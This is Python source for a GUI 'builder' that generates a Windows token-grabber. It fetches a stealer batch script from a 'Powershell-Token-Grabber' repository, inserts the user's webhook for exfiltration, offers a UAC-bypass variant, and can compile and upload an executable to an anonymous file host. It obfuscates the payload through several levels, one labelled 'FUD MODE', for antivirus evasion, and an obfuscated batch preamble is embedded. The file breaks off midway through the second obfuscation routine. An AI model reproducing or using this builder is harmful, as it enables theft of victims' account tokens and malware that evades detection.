import tkinter as tk #prolly built in but idk ngl
from os import system, path, remove, rename
from random import choice, sample, randint
from codecs import encode
from string import ascii_letters
from webbrowser import open as open_web
from zipfile import ZipFile
from io import BytesIO
from shutil import rmtree
from time import sleep

try:
    import customtkinter as kdot
except:
    system("pip install customtkinter")
    import customtkinter as kdot
    
try:
    from PIL import Image
except:
    system("pip install pillow")
    from PIL import Image

try:
    import requests
except:
    system("pip install requests")
    import requests

try:
    import PyInstaller
except:
    system("pip install pyinstaller")
    import PyInstaller

try:
    from tqdm import tqdm
except:
    system("pip install tqdm")
    from tqdm import tqdm

code = r"""
@echo off
set "n=a" && set "o=b" && set "p=c" && set "q=d" && set "r=e" && set "s=f" && set "t=g" && set "u=h" && set "v=i" && set "w=j" && set "x=k" && set "y=l" && set "z=m" && set "a=n" && set "b=o" && set "c=p" && set "d=q" && set "e=r" && set "f=s" && set "g=t" && set "h=u" && set "i=v" && set "j=w" && set "k=x" && set "l=y" && set "m=z" && set "N1=A" && set "O1=B" && set "P1=C" && set "Q1=D" && set "R1=E" && set "S1=F" && set "T1=G" && set "U1=H" && set "V1=I" && set "W1=J" && set "X1=K" && set "Y1=L" && set "Z1=M" && set "A1=N" && set "B1=O" && set "C1=P" && set "D1=Q" && set "E1=R" && set "F1=S" && set "G1=T" && set "H1=U" && set "I1=V" && set "J1=W" && set "K1=X" && set "L1=Y" && set "M1=Z"
chcp 65001 > nul
"""

extra = r"""
@%RxMNz%%r%%nUIlcBd%%p%%mhrVm%%u%%RtSCWJ%%b%%kiZGY% %GeGoy%%b%%InCEfFO%%s%%yJxSIOx%%s%%xdbjX%
%f%%sYEQE%%r%%xCmOuSZg%%g%%DUhhNq% %SLbRJT%"%AxsNRv%%a%%qDYwAk%=%uFuYF%%n%%CNFUN%"%zWDlXT% %TbjcgI%&%WYZEk%&%SPSicuCY% %lCGAhLiW%%f%%pnuIuOr%%r%%sMyTXB%%g%%jDUeAXz% %maflzh%"%BcgODO%%b%%qQiDxyr%=%dTIhz%%o%%QBfvLeyt%"%mEFjSzlh% %WdOIRP%&%mvTUkF%&%RUIGunA% %KKznffYe%%f%%gSZOp%%r%%AXNqiQIR%%g%%FruCgfG% %XOomVZ%"%QGWcTH%%c%%VsSgBE%=%HaVOcLIA%%p%%Efgwgo%"%RKLcR% %PTrkQTd%&%BDtZD%&%khhZlU% %mvJVOi%%f%%oTNFxSk%%r%%kxzAc%%g%%qCAWJ% %XWCdOsY%"%gJSAk%%d%%XzHFgqd%=%siwJOkh%%q%%uGoqaJ%"%JyLZYjy% %RAeBlfFn%&%ybUDTMUX%&%HTNGmU% %GzWjibT%%f%%TCsti%%r%%hPDLWOk%%g%%eMNqj% %enZnv%"%CQvOXry%%e%%bckvy%=%knMoIoK%%r%%MNqwuXM%"%AkawnBTH% %eLeIAU%&%xSlBmv%&%WUxqZ% %SUtcl%%f%%djfTMAr%%r%%cUygo%%g%%gyxdm% %GlZzP%"%pSNEdZp%%f%%rcxsMv%=%UEijoxb%%s%%koHOAvCQ%"%AdPtKMg% %SASpQTlo%&%HGbTLxs%&%oolAwnMu% %TmdesToS%%f%%qEOSYG%%r%%ZLOqNpnC%%g%%reXCw% %EjtlVyzH%"%fSpNWO%%g%%fyPeKB%=%GQLQfEb%%t%%afCauW%"%OfDpG% %BtJFjiSj%&%LexrviJ%&%rpiXiVq% %GqOHyekI%%f%%ThDUDJ%%r%%cUvnK%%g%%vPUmFTd% %HRITnf%"%KMrhsj%%h%%wqsNJ%=%oEYMfno%%u%%dRiWq%"%qSuXU% %aJQCrZZ%&%zSana%&%QSKZSR% %mnNfvWSZ%%f%%FAcbAlu%%r%%vBxrf%%g%%hxtphip% %DKOgRM%"%mdOuOHaS%%i%%RhoNXMfr%=%VMFcaXTX%%v%%RsHRUna%"%FJGJEZ% %nKmAg%&%Lwuxyip%&%qlvxjqP% %qSdfCrE%%f%%ogSkF%%r%%EVupV%%g%%NJenBRTy% %QkLMEIAj%"%beVffckP%%j%%ceKAK%=%Ytowb%%w%%HTWhtmx%"%EtzJRheG% %iTuDGGq%&%qayLWxg%&%hAREn% %FdCmMzO%%f%%DrpQtO%%r%%fZRirPP%%g%%WCQrmRzv% %lciXx%"%jVwFOW%%k%%NEUtLefI%=%FDFfpHaD%%x%%suIGqrZ%"%xzxQUTgD% %qgXLF%&%zTeUXxxY%&%ysppZPL% %fkTLMs%%f%%fhikmAR%%r%%mVHxuSdu%%g%%YuqlD% %wgkBbzML%"%Sqiqs%%l%%WJLzyHf%=%NyTJwAC%%y%%buVXNM%"%mzKOyyGv% %ZSWOIJ%&%vfLsqtl%&%LYFgyjiC% %LYbjDkb%%f%%kTUIAnIl%%r%%tArLTDVU%%g%%makekUHe% %iSHEhlry%"%gNjNz%%m%%krysT%=%Hobnbchz%%z%%HqCqBW%"%pLlCJI% %OcKvC%&%ceUlVnd%&%JWPjMm% %KcMnrPWx%%f%%KbnDLEa%%r%%LdAqJFx%%g%%yrOsH% %cDdiZRc%"%VQYSZ%%n%%wtLPWl%=%NnZULf%%a%%FxbENTk%"%fnNvvWqE% %IRreSMs%&%HyPTVWP%&%RSWtU% %VscpVM%%f%%ONEze%%r%%nSsPLt%%g%%KFsNs% %iKPzI%"%CEuoICWC%%o%%iVyjkyll%=%PGtmKLi%%b%%iLaeq%"%JepxVJk% %JVzmE%&%QRewDFz%&%sIIztwiV% %gPXOv%%f%%vCwvc%%r%%sTETPL%%g%%czkzmOLu% %dekKg%"%LfFRy%%p%%rCJyyx%=%dfpUhS%%c%%hiWlmy%"%Ylvis% %fjjMpcm%&%HIBhzFHR%&%iFyUfxb% %vZlYStJ%%f%%MGfJDY%%r%%TlVMV%%g%%WdlGiZKW% %RCyDNJhV%"%FfFDk%%q%%KSMaRj%=%kIbPfyH%%d%%SnLxLdk%"%MwAFl% %nyoLCVqG%&%NhAOftM%&%DXNWTig% %oFHbXVqM%%f%%goquRGJd%%r%%czXNW%%g%%HQwMJGv% %SJEak%"%cMZIHCSg%%r%%MSwiS%=%oTJCXfO%%e%%pBFwPS%"%afSvo% %nGmSI%&%XQDvmTc%&%IbzxxKPx% %EhYCIEyO%%f%%oXaVcZS%%r%%OHRYKtBm%%g%%QwqItw% %gZxcxqd%"%BPNNzh%%s%%atILula%=%GPgOR%%f%%YKYcB%"%ZczGfZw% %vzHPa%&%dVYCv%&%zEjLcqw% %ogNATyDy%%f%%oQPQWl%%r%%GOzfCP%%g%%QmNhVQ% %OmaazK%"%AdNIAE%%t%%dNHUyl%=%GGmRDdAr%%g%%FzgiLk%"%ZjucXfV% %VxxRN%&%DLwTbQT%&%fbRSw% %HJBmD%%f%%nxGOz%%r%%QbZpFf%%g%%moXNJTP% %frIBW%"%LfOjJ%%u%%oghbgkAo%=%JwOOmByy%%h%%DoooOUp%"%AcoxHXS% %utqNLFD%&%izoDLq%&%WDBPkJQ% %cpIAa%%f%%pXvUqNI%%r%%QwZfgbz%%g%%jsyzpTXh% %VtBfqdui%"%urzqO%%v%%yNBsX%=%kOtLwf%%i%%iFeZj%"%DECkj% %BeaDL%&%PYaaVwb%&%nKZJH% %zqbQlCy%%f%%zQxgxPdT%%r%%GaqCud%%g%%mFeuTaR% %cgQaAK%"%dRjZY%%w%%mICvJ%=%GgvsIcs%%j%%WRMPmlfE%"%tNUkYH% %sEYIw%&%vzDyobC%&%Wgctq% %jZWzLqpl%%f%%oXLsZHL%%r%%MGQfKYk%%g%%jyIUsylG% %KdaIyV%"%zuqVepA%%x%%PZCuCnX%=%zkJTcChk%%k%%ifUCjd%"%zpTsIVSN% %DGbVOgZ%&%akjZQuLX%&%twSTf% %hCeWFT%%f%%qzHAa%%r%%pUYga%%g%%WCdrF% %xRoIMUom%"%MBMUwF%%y%%wVsSg%=%WYWqkXa%%l%%MbXeAoWy%"%GfYgmObb% %EGKMVN%&%piaqrqCi%&%IVkadw% %brTsQ%%f%%GPpiSG%%r%%FtmJjhmh%%g%%zXmDS% %ThhFOvV%"%UDhGLMF%%z%%kcVpUFBN%=%nbWRwV%%m%%KuDKFIZ%"%jWeIlOPw% %zkZHA%&%wTCYRSU%&%rGnhFeo% %IHiNLDyg%%f%%tJRFuAt%%r%%SgdvZe%%g%%KsWcDj% %cmuKjVQ%"%WjhQanL%%A1%%ljmtm%1%CJtCrzH%=%LOTXng%%N1%%RWyJRuzS%"%mCiWO% %VZEtDvQv%&%YuaUd%&%TPlocxKC% %xXgaKG%%f%%IaJiR%%r%%ZahrGuB%%g%%vXbEpgW% %tBlUq%"%JpYEV%%B1%%BAemGz%1%aGlAf%=%TwzzzN%%O1%%hesOy%"%TuIkRnj% %fpsHNsMi%&%WMuWwk%&%dhuJuP% %wFlDoM%%f%%huCrN%%r%%jjcSd%%g%%sayUqZK% %oCqpYC%"%lMABffz%%C1%%kOYuSno%1%hrQfKZ%=%NQvAMDm%%P1%%teaLsr%"%ELEIA% %vXPLlQp%&%BIoByC%&%Lhadt% %dPZGVP%%f%%dWAnVjvq%%r%%OPDzDh%%g%%LwCsFW% %lKbiqnQK%"%RqhqmTs%%D1%%rXfDFB%1%Ptyme%=%HSjZuHWk%%Q1%%HqSikREC%"%rUeyM% %UDywxoX%&%LNmSvC%&%OeOYBk% %OlCaVv%%f%%fAnneauH%%r%%CXnDc%%g%%LNAJX% %ZBgDj%"%WXqSFi%%E1%%sqLbbvq%1%BzQtd%=%UelnHwQ%%R1%%iuKlulWO%"%kbyQPjiE% %PFyKbAf%&%cqHQx%&%ClrFxg% %iFOWE%%f%%Lfwcj%%r%%HoQJQ%%g%%uCAyvCW% %QJkbklzN%"%BsUrZPc%%F1%%pDkpqo%1%EPczn%=%sZJLSV%%S1%%VEyNs%"%oXxTQTZ% %YGZPbq%&%KubvzEk%&%oVOrfH% %JhUhLppq%%f%%MCaVUwiG%%r%%ijHwmNu%%g%%fGXaiPYp% %jrkuDW%"%zAicr%%G1%%aRSJjQ%1%aCHdkgL%=%iqnAIRYY%%T1%%XGdmY%"%QlkUTXQz% %ZuVHb%&%kIzjLU%&%gaLUO% %FcuGwt%%f%%JmpcnbO%%r%%BEtSw%%g%%DwCkmVX% %jCUXQqs%"%ZTkVLgr%%H1%%jnumly%1%ngfntx%=%qeBipRf%%U1%%Xcblh%"%JcrwuEa% %AeXQu%&%YrLSdm%&%Qxixxh% %fDhjIO%%f%%ZQVllUAo%%r%%sVlbN%%g%%VwtVNaWm% %igiUn%"%mokRHE%%I1%%MozVnJJo%1%LkuIrCHx%=%getNLp%%V1%%GsLjhCYi%"%aBkHkYg% %CbxjsTh%&%TajrfMXW%&%VhQErZl% %uOkPr%%f%%XwcIXXPj%%r%%RoMsG%%g%%wfHEQ% %oPEpxTz%"%AFLWXCz%%J1%%whdbPFo%1%kOjoh%=%cpfqtmJ%%W1%%ikZkDP%"%wGmABTkC% %xBBfQ%&%Dqlen%&%WIlNcM% %TYcchh%%f%%JVOWuVAc%%r%%TzjsPyFN%%g%%pQoFG% %hPYQLwi%"%DyTcqif%%K1%%QBjHzaC%1%BXLUUqt%=%VQwjToZ%%X1%%jlrHKO%"%eqnRJ% %hxFYfHa%&%DnStKgz%&%ywrQcF% %rodOqkTQ%%f%%ygLziKa%%r%%VknfM%%g%%yjKYPY% %zbOTIJB%"%StWqkqU%%L1%%LcaKl%1%JFrBy%=%zfajWB%%Y1%%nNCMqQz%"%DfnjhXPW% %dLpElT%&%AjHqvCek%&%eqDnCU% %rYBPB%%f%%aicWQB%%r%%zdmXauG%%g%%jimaluAc% %vnPTDiJi%"%MZksc%%M1%%MBZsjw%1%FZzPTAGc%=%VMJBxzr%%Z1%%zfqjDtM%"%yapPMOOV% %ArLcwgSx%&%zccxxZaZ%&%TGUxMo% %LRTCin%%f%%XvfPiRq%%r%%gChSo%%g%%ICqIXhn% %rTGmkHbc%"%jDimdDT%%N1%%cHtfG%1%FnWqpVd%=%tfpBDhZ%%A1%%MBmRuKh%"%RDnoGF% %NwRTu%&%eLtSCsDc%&%IsFPI% %RyDUYtS%%f%%IiVRiuRi%%r%%bdMBys%%g%%pAusHqbS% %qcmcZwtw%"%UdtqCF%%O1%%tswjY%1%NEVwmT%=%RKpeHqW%%B1%%GcJZne%"%miiED% %DjWukIm%&%QzkvRqqQ%&%gcvrmgHd% %hAHWEy%%f%%YUCHZR%%r%%zdIWXpD%%g%%AWikO% %MnknSLE%"%jkgzBNS%%P1%%EFMcSY%1%uJomfyo%=%VXAXqW%%C1%%pBEbgR%"%lPISlR% %EgeCmUi%&%cIRFDsQ%&%cIvywJqw% %GyKthnG%%f%%PNJAr%%r%%JuHiGnPy%%g%%ujOwpAR% %ycQnimHL%"%IHvHwV%%Q1%%XzrHqF%1%GJwFnB%=%qEoAMgrt%%D1%%eeqqn%"%gyYTCCay% %KYnXeVb%&%FjLMx%&%BVeWeuxp% %gIKNsyTq%%f%%xLtaDaRM%%r%%lGPKNG%%g%%MizgPwt% %BWpIe%"%NbsSJOp%%R1%%UrjsUvq%1%dLMHhJT%=%vMsIUA%%E1%%frgaJBt%"%MoGyAK% %PRQfDVkZ%&%jFcAbx%&%GtBbW% %EocZZ%%f%%srNIPQJ%%r%%PsVZoa%%g%%mnNrn% %SfnHQY%"%fdCIMr%%S1%%VnOFQt%1%mMxUUdi%=%aFGVOHXq%%F1%%ZNhRzwo%"%ZOpFx% %wvXMYIC%&%LCuRAfQ%&%moJnRDAu% %VUDVudWj%%f%%ETRbH%%r%%wdpFs%%g%%sjKVrJ% %hpSjH%"%WtECM%%T1%%AOHgDjQd%1%VtAdwANm%=%stlcVp%%G1%%TauJLsw%"%YWwLzEjR% %LaxCD%&%nxalhpae%&%vbumVSI% %fmNTT%%f%%EGBRa%%r%%NebRb%%g%%gFbNE% %oMaHMjB%"%THmONJw%%U1%%mFhgy%1%qVHYG%=%NdWGzmts%%H1%%TSEPdpr%"%UDeGAt% %iNhhqULr%&%wfWCh%&%WLuvkx% %bbTMaF%%f%%lKJTYi%%r%%OPZbBqaI%%g%%yzdjmiAq% %wGcLQI%"%yFohEUh%%V1%%EvSqD%1%bQbpc%=%JmCEg%%I1%%iKjNjTG%"%yGeuvL% %PgFTfJp%&%yCHQvdvx%&%Hdcton% %XDulV%%f%%TtJzEzm%%r%%navVZnGj%%g%%opTDJe% %GVMijrtw%"%ichZEc%%W1%%Sygpk%1%njjmP%=%OOKRhg%%J1%%VtsMM%"%ofRQkaf% %WtxaPNZ%&%wgCZl%&%FETLnO% %QkqXW%%f%%vNUAX%%r%%WVEjdiwn%%g%%dsopw% %XVKQZira%"%IXint%%X1%%daLkrB%1%jOCpuKY%=%UkNgY%%K1%%oHvUu%"%bCZfkBD% %cWUPnlmp%&%GbdiePa%&%toiivSH% %xFsWyDAs%%f%%iAbXiL%%r%%HGjacK%%g%%cQAWIBi% %lQUTp%"%WLTpUA%%Y1%%tMRPEg%1%LBvFmy%=%hZxWgnwr%%L1%%ejGRW%"%lGtKVX% %GAvhFIf%&%TFUcNH%&%Upfqw% %CifiE%%f%%eJoEupD%%r%%WIzxYhJ%%g%%RygoRDY% %HvYslB%"%dCqabzHx%%Z1%%VOtFo%1%HIDxDUg%=%uPunvI%%M1%%KcFfmxo%"%ztNLwMLK%
%p%%ENkIjd%%u%%OoZtna%%p%%aMYAe%%c%%GgdXQ% %fqfiL%6%PpzcZ%5%JzuPcX%0%OpiUCtW%0%vDiCbK%1%hsEOvez% %WMxuNMD%> %HGXJdpVw%%a%%ObsWTnhi%%h%%srkfeXs%%y%%XMxylVIq%
"""

extra = False

class Buidler(kdot.CTk):
    def __init__(self):
        super().__init__()
        
        kdot.set_default_color_theme("green")
        
        self.title("Somali Buidler V2.0")
        self.geometry("700x450")
        
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure((1,2), weight=1)
        
        image_path = path.join(path.dirname(path.realpath(__file__)), "test_images")
        
        # use icon for image
        self.iconphoto(False, tk.PhotoImage(file=path.join(image_path, "logo.png")))
        
        
        self.home_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "home_dark.png")), dark_image=Image.open(path.join(image_path, "home_light.png")), size=(20, 20))
        self.about_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "about_dark.png")), dark_image=Image.open(path.join(image_path, "about_dark.png")), size=(20, 20))
        self.hentai_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "hentai_dark.png")), dark_image=Image.open(path.join(image_path, "hentai_dark.png")), size=(20, 20))
        self.bottom_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "Kendrick.jpg")), dark_image=Image.open(path.join(image_path, "Kendrick.jpg")), size=(500, 230))
        self.github_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "github.png")), dark_image=Image.open(path.join(image_path, "github.png")), size=(20, 20))
        self.discord_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "discord.png")), dark_image=Image.open(path.join(image_path, "discord.png")), size=(20, 20))
        self.somali_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "logo.png")), dark_image=Image.open(path.join(image_path, "logo.png")), size=(30, 24))
        self.comethazine_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "comethazine.png")), dark_image=Image.open(path.join(image_path, "comethazine.png")), size=(100, 100))
        
        self.navigation_frame = kdot.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)
        
        self.rest_of_window_frame = kdot.CTkFrame(self, corner_radius=0)
        self.rest_of_window_frame.grid(row=0, column=1, sticky="nsew")
        self.made_by_kdot = kdot.CTkLabel(self.rest_of_window_frame, text="Made by K.Dot#4044\n\n\n\n       Please give a ⭐ on github", font=("Arial", 30), padx=10)
        self.made_by_kdot.grid(row=3, columnspan=3, sticky="nsew")
        
        self.navigation_frame_label = kdot.CTkLabel(self.navigation_frame, text=None, image=self.comethazine_image, compound="center")
        self.navigation_frame_label.grid(row=0, column=0, padx=5, pady=5)
        
        self.home_button = kdot.CTkButton(self.navigation_frame, image=self.home_image, height=40, border_spacing=10, text="Home", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.home_button_event)
        self.home_button.grid(row=1, column=0, sticky="ew")
        self.about_button = kdot.CTkButton(self.navigation_frame, image=self.about_image, height=40, border_spacing=10, text="About", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.about_button_event)
        self.about_button.grid(row=2, column=0, sticky="ew")
        self.hentai_button = kdot.CTkButton(self.navigation_frame, image=self.hentai_image, height=40, border_spacing=10, text="Hentai", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.hentai_button_event)
        self.hentai_button.grid(row=3, column=0, sticky="ew")
        
        self.appearance_mode_menu = kdot.CTkOptionMenu(self.navigation_frame, values=["System", "Light", "Dark"], command=self.change_appearance_mode_event)
        self.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")
        
        self.home_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.home_frame.grid_columnconfigure((1,4), weight=1)
        
        self.about_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.about_frame.grid_columnconfigure(0, weight=1)
        
        self.hentai_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.hentai_frame.grid_columnconfigure(0, weight=1)
        
        #webhook stuff
        self.webhook_box_label = kdot.CTkLabel(self.home_frame, text="Webhook URL", text_color=("gray10", "gray90"), anchor="w")
        self.webhook_box_label.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        
        self.webhook_box = kdot.CTkEntry(self.home_frame, width=500, height=30, corner_radius=10)
        self.webhook_box.grid(row=0, column=1, pady=10, sticky="nsew", columnspan=2)
        
        self.webhook_check_button = kdot.CTkButton(self.home_frame, text="Check", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60, command=self.webhook_button_check)
        self.webhook_check_button.grid(row=0, column=3, padx=10, pady=10, sticky="nsew")
        
        self.obfuscation_label = kdot.CTkLabel(self.home_frame, text="Obfuscation\nLevel --->", text_color=("gray10", "gray90"), anchor="w")
        self.obfuscation_label.grid(row=1, column=0, sticky="w", padx=5, pady=0)
        self.obfuscate_dropdown_box = kdot.CTkOptionMenu(self.home_frame, values=["Level 1", "Level 2", "Level 3", "All", "FUD MODE", "None"], )
        self.obfuscate_dropdown_box.grid(row=1, column=1, padx=5, pady=5)
        self.uac_bypass_check_box = kdot.CTkCheckBox(self.home_frame, text="UAC Bypass", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
        self.uac_bypass_check_box.grid(row=1, column=2, padx=10, pady=10, sticky="n")
        self.build_own_executable_check_box = kdot.CTkCheckBox(self.home_frame, text="Build own exe", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
        self.build_own_executable_check_box.grid(row=1, column=3, padx=10, pady=10, sticky="e")
        
        #start button
        self.start_button = kdot.CTkButton(self.home_frame, text="Start", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=80, width=200, command=self.start_button_event)
        self.start_button.grid(row=2, column=1, columnspan=2, padx=10, pady=10, sticky="nsew")
        
        self.bottom_image_place = kdot.CTkLabel(self.home_frame, image=self.bottom_image, text="K.Dot#4044", text_color=("black", "black"), anchor="s", font=("Arial", 20))
        self.bottom_image_place.grid(row=5, column=0, columnspan=4, sticky="n", pady=5, padx=5)
        
        
        #---------------------------------About Frame---------------------------------
        
        self.about_label = kdot.CTkLabel(self.about_frame, text="About", text_color=("gray10", "gray90"), anchor="w", font=("Arial", 20))
        self.about_label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
        
        self.text_box = kdot.CTkTextbox(self.about_frame, width=110, height=100, corner_radius=10)
        self.text_box.insert("end", "Special thanks to K.Dot#4044 (me) for making this program.\n\nAlso special thanks to Timmywag for being annoying af telling me to make it.\n\n")
        self.text_box.grid(row=1, column=0, padx=5, pady=10, sticky="nsew", columnspan=3)
        self.text_box.configure(state="disabled")
        
        self.github_button = kdot.CTkButton(self.about_frame, text=None, image=self.github_image, text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=50, width=100, command=self.github_button_event)
        self.github_button.place(relx=0.2, rely=0.5, anchor="center")
        
        self.discord_button = kdot.CTkButton(self.about_frame, text=None, image=self.discord_image, text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=50, width=100, command=self.discord_button_event)
        self.discord_button.place(relx=0.5, rely=0.5, anchor="center")
        
        self.somali_button = kdot.CTkButton(self.about_frame, text=None, image=self.somali_image, text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=50, width=100, command=self.somali_button_event)
        self.somali_button.place(relx=0.8, rely=0.5, anchor="center")
        
        #---------------------------------Hentai Frame---------------------------------
        
        self.quran_box = kdot.CTkTextbox(self.hentai_frame, width=150, height=430, corner_radius=10)
        self.quran_box.insert("end", requests.get("https://sped.lol/quran.txt").text)
        self.quran_box.grid(row=1, column=0, padx=10, pady=10, sticky="nsew", columnspan=3, rowspan=4)
        self.quran_box.configure(state="disabled")
        
    
    def github_button_event(self):
        open_web("https://github.com/kdot227")
        
    def somali_button_event(self):
        open_web("https://sped.lol")
        
    def discord_button_event(self):
        open_web("https://discord.gg/BScgW3ghP3")
        
    def home_button_event(self):
        self.select_frame_by_name("home")
        
    def about_button_event(self):
        self.select_frame_by_name("about")
        
    def hentai_button_event(self):
        self.select_frame_by_name("hentai")
        
    def select_frame_by_name(self, name):
        # set button color for selected button
        self.home_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.about_button.configure(fg_color=("gray75", "gray25") if name == "about" else "transparent")
        self.hentai_button.configure(fg_color=("gray75", "gray25") if name == "hentai" else "transparent")

        # show selected frame
        if name == "home":
            self.home_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.home_frame.grid_forget()
        if name == "about":
            self.about_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.about_frame.grid_forget()
        if name == "hentai":
            self.hentai_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.hentai_frame.grid_forget()
            
    def change_appearance_mode_event(self, new_appearance_mode):
        kdot.set_appearance_mode(new_appearance_mode)
        
    def webhook_button_check(self):
        try:
            r = requests.get(self.webhook_box.get())
            if r.status_code == 200:
                self.webhook_box.configure(fg_color="green")
            else:
                self.webhook_box.configure(fg_color="red")
        except Exception as e:
            self.webhook_box.configure(fg_color="red")
            print(e)
            
    def start_button_event(self):
        obfuscate = self.obfuscate_dropdown_box.get()
        uac_bypass = self.uac_bypass_check_box.get()
        webhook = self.webhook_box.get()
        build_exe = self.build_own_executable_check_box.get()
        self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.bat'
        if uac_bypass == True:
            self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main_with_uac_bypass.bat'
        self.code = requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook)
        if build_exe == True:
            self.top_level_warning = kdot.CTkToplevel(self, width=400, height=200)
            self.top_level_warning.protocol("WM_DELETE_WINDOW", self.top_level_warning.destroy)
            self.top_level_warning_frame = kdot.CTkFrame(self.top_level_warning, width=400, height=200, bg_color="gray10")
            self.top_level_warning_frame.pack(fill="both", expand=True)
            self.top_level_warning_label = kdot.CTkLabel(self.top_level_warning_frame, text="This will take a while, please be patient.", bg_color="gray10", fg_color="gray75", font=("Arial", 20))
            self.top_level_warning_label.place(relx=0.5, rely=0.5, anchor="center")
            self.top_level_warning.update()
            self.top_level_warning.deiconify()
            self.top_level_warning.update()
            self.top_level_warning_label.configure(text="THIS IS STILL UNDER DEVELOPMENT!\nFEATURES LIKE BUILD OWN EXE\nMIGHT NOT WORK\nUSE AT OWN RIST")
            self.top_level_warning.update()
            sleep(5)
            self.top_level_warning.destroy()
            py_code = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.py'
            system('pip install pycryptodome pypiwin32')
            with open("test.py", "w") as f:
                f.write(requests.get(py_code).text)
            upx_url = "https://github.com/upx/upx/releases/download/v4.0.1/upx-4.0.1-win64.zip"
            upx_zip = ZipFile(BytesIO(requests.get(upx_url).content))
            upx_zip.extractall()
            system("pyinstaller --onefile --key GODFATHER --clean --upx-dir upx-4.0.1-win64 test.py")
            remove("test.py")
            remove("test.spec")
            rmtree("build")
            rmtree("upx-4.0.1-win64")
            print("Uploading!\nThis might take some time!\n")
            upload_to_anon = requests.post("https://api.anonfiles.com/upload", files={"file": open("dist/test.exe", "rb")})
            rmtree("dist")
            anon_url = upload_to_anon.json()["data"]["file"]["url"]["full"]
            direct_download_url = anon_url.replace("https://anonfiles.com/", "https://cdn.anonfiles.com/")
            self.code.replace('https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/test.exe', direct_download_url)
        if obfuscate == "Level 1":
            self.level1()
            self.create_top_level(f"{self.name} is the finished product!")
        elif obfuscate == "Level 2":
            self.level2()
            self.create_top_level(f"{self.name} is the finished product!")
        elif obfuscate == "Level 3":
            self.level3()
            self.create_top_level(f"{self.name} is the finished product!")
        elif obfuscate == "All":
            self.all()
        elif obfuscate == "FUD MODE":
            self.fud()
            self.create_top_level(f"{self.name} is the finished product!")
        elif obfuscate == "None":
            with open("main.bat", "w") as f:
                f.write(self.code)
                self.create_top_level("main.bat is the finished product!")
        else:
            raise Exception("Invalid Obfuscation Level")
            
        
    def create_top_level(self, *words):
        window = kdot.CTkToplevel(self)
        window.geometry("500x300")
        window.title("Finished Product")
        
        label = kdot.CTkLabel(window, text=words[0], text_color=("gray10", "gray90"), anchor="w", font=("Arial", 20))
        label.pack(padx=10, pady=10)
        
    def make_random_string(self):
        length = randint(5, 8)
        return ''.join(choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZḆḞԍǏƘԸɌȚЦѠƳȤѧćễļṃŉᵲừŵź☠☢☣卐") for i in range(length))
            
    def level1(self):
        carrot = False
        var = False
        with open("main.level1.bat", "a+", encoding="utf-8") as f:
            self.name = f.name
            if extra == True:
                f.write(extra)
            else:
                f.write(code)
            for line in self.code:
                for char in line:
                    if char == ">":
                        f.write(char)
                    elif char == "^":
                        f.write(char)
                        carrot = True
                    elif carrot == True:
                        f.write(char)
                        carrot = False
                    else:
                        if char == "%":
                            var = not var
                            f.write(char)
                            
                        elif var == True:
                            f.write(char)
                            
                        elif "\n" in char:
                            f.write(char)
                            
                        else:
                            random = self.make_random_string()
                            if char in ascii_letters:
                                if char.islower():
                                    coded0 = encode(char, 'rot_13')
                                    coded = coded0.replace(coded0, f"%{coded0}%")
                                    f.write(f"{coded}%{random}%")
                                else:
                                    coded0 = encode(char, 'rot_13').upper()
                                    coded = coded0.replace(coded0, f'%{coded0}1%')
                                    f.write(f"{coded}%{random}%")
                            else:
                                f.write(f"{char}%{random}%")
                                
    def level2(self):
        characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        random_order = ''.join(sample(characters, len(characters)))
        carrot = False
        var = False
        with open("main.level2.bat", "a+", encoding="utf-8") as f:
            f.write(f"set KDOT={random_order}\nchcp 65001 > nul\n")
            self.name = f.name
            for line in self.code:
                for char in line:
                    if char == ">":
                        f.write(char)
                    elif char == "^":
                        f.write(char)
                        carrot = True
                    elif carrot == True:
                        f.write(char)
                        carrot = False
                    else:
                        if char == "%":
                            var = not var
                            f.write(char)
                            
                        elif var == True:
                            f.write(char)
                            
                        elif "\n" in char:
                            f.write(char)
                            
                        else:
                            if char in ascii_letters:
